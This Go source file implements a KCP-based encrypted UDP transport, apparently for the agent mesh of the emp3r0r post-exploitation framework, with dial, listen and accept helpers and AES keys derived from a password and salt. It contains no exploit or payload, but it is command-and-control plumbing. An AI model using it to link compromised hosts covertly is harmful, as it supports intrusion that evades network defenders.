//go:build !no_mesh && !no_kcp

package transport

// mesh_transport_kcp.go — the KCP-backed mesh transport. It is split out of
// mesh_transport.go so a build that keeps the mTLS mesh can still drop the
// xtaci KCP stack (kcptun, smux, qpp, tcpraw, gopacket).

import (
	"context"
	"fmt"
	"net"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	kcp "github.com/xtaci/kcp-go/v5"
)

// DialKCP creates a single encrypted KCP stream (AES-256 block cipher) to addr.
// addr is "host:port". password and salt are used to derive the AES-256 key.
// Returns a net.Conn wrapping the KCP session stream.
func DialKCP(addr, password, salt string) (net.Conn, error) {
	key := meshKey(password, salt)
	block, err := kcp.NewAESBlockCrypt(key)
	if err != nil {
		return nil, fmt.Errorf("DialKCP: block cipher: %v", err)
	}
	sess, err := kcp.DialWithOptions(addr, block, 10, 3)
	if err != nil {
		return nil, fmt.Errorf("DialKCP: dial %s: %v", addr, err)
	}
	// Mirror fast-mode settings from KCPTunClient defaults.
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetWindowSize(128, 1024)
	sess.SetMtu(1350)
	sess.SetACKNoDelay(false)
	return sess, nil
}

// ListenKCP creates a persistent, encrypted KCP listener on kcpPort.
// Caller is responsible for closing it (e.g. when ctx is done).
// Use AcceptKCPConn to accept individual connections from the returned listener.
func ListenKCP(kcpPort, password, salt string) (*kcp.Listener, error) {
	key := meshKey(password, salt)
	block, err := kcp.NewAESBlockCrypt(key)
	if err != nil {
		return nil, fmt.Errorf("ListenKCP: block cipher: %v", err)
	}
	l, err := kcp.ListenWithOptions(":"+kcpPort, block, 10, 3)
	if err != nil {
		return nil, fmt.Errorf("ListenKCP: listen :%s: %v", kcpPort, err)
	}
	return l, nil
}

// AcceptKCPConn accepts the next KCP connection from an existing listener.
// Blocks until a connection arrives or ctx is done.
func AcceptKCPConn(l *kcp.Listener, ctx context.Context) (net.Conn, error) {
	type result struct {
		conn *kcp.UDPSession
		err  error
	}
	ch := make(chan result, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logging.Errorf("Mesh KCP accept goroutine panicked: %v", r)
				ch <- result{nil, fmt.Errorf("accept panicked: %v", r)}
			}
		}()

		conn, err := l.AcceptKCP()
		ch <- result{conn, err}
	}()

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case r := <-ch:
		if r.err != nil {
			return nil, fmt.Errorf("AcceptKCPConn: %v", r.err)
		}
		r.conn.SetNoDelay(1, 10, 2, 1)
		r.conn.SetWindowSize(128, 1024)
		r.conn.SetMtu(1350)
		return r.conn, nil
	}
}

// KCPTransport wraps the existing KCP implementation.
type KCPTransport struct{}

func (t KCPTransport) Supported() bool { return true }

func (t KCPTransport) Dial(addr, password, salt string) (net.Conn, error) {
	return DialKCP(addr, password, salt)
}

func (t KCPTransport) Listen(port, password, salt string) (net.Listener, error) {
	return ListenKCP(port, password, salt)
}

func (t KCPTransport) Accept(ctx context.Context, l net.Listener) (net.Conn, error) {
	kcpListener, ok := l.(*kcp.Listener)
	if !ok {
		return nil, fmt.Errorf("KCPTransport: listener is not a *kcp.Listener")
	}
	return AcceptKCPConn(kcpListener, ctx)
}

func init() {
	RegisterTransport("kcp", KCPTransport{})
}
